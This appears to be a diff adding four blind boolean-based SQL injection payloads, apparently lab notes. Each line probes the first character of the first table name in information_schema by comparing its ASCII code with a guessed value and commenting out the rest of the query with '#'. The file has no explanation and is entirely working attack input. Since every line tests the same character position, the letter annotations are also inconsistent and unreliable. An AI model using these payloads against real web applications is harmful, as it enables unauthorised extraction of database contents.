@@ -1,0 +1,4 @@
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 103#  g
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 117#  u
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 101#  e
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 75#  K
